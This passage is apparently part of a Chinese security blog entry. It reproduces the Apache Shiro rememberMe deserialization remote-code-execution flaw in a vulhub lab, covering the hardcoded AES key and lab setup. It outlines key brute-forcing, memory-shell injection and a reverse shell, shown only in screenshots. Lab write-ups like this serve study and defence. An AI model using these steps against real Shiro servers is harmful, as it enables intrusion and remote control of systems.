的值</span><br><span class="hljs-number">2</span>.Base64解码<br><span class="hljs-number">3</span>.使用AES解密(加密密钥硬编码)<br><span class="hljs-number">4</span>.进行反序列化操作（未作过滤处理）<br><span class="hljs-number">5</span>.在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。<br></code></pre></td></tr></table></figure><p><strong>影响版本:1.2.4以下</strong></p><p>解决payload过长的方式：</p><ol><li>使用urlclassloader加载远程字节码</li><li>将字节码放在post的body中,恶意类实现加载body中的字节码即可.</li></ol><h2 id="二、漏-洞-复-现"><a href="#二、漏-洞-复-现" class="headerlink" title="二、漏 洞 复 现"></a>二、漏 洞 复 现</h2><p>使用vulhub靶场进行复现，启动漏洞环境：</p><p>进入shiro漏洞目录，然后执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> CVE-<span class="hljs-number">2016</span>-<span class="hljs-number">4437</span><br><span class="hljs-attribute">sudo</span> docker-compose up -d<br></code></pre></td></tr></table></figure><p>然后等待一会儿就好~比如像下图这样</p><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/clipboard.png"></p><p>访问<a href="http://192.168.56.132:8080/%E6%AD%A3%E5%B8%B8%E7%99%BB%E9%99%86">http://192.168.56.132:8080/正常登陆</a></p><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210906154425847.png"></p><p>使用burp进行抓包，查看返回包</p><ul><li>响应包中出现&lt;rememberMe=deleteMe&gt;可以用来大概判断是否使用了Shiro</li></ul><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210906155015344.png"></p><p>可以使用工具尝试爆破一下密钥以及利用链，如果可爆破出密钥及利用链，则可以命令执行，以及注入内存马。</p><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210906193607965.png"></p><p>vps监听本地端口</p><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210906194501623.png"></p><p>利用工具可以进行反弹shell</p><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210906194057296.png"></p><p>反弹成功</p><p><img src="/2022/04/14/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20210906194749015.png"></p>]]></content>
    
    
    <categories>
      
      <category>安全笔记</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
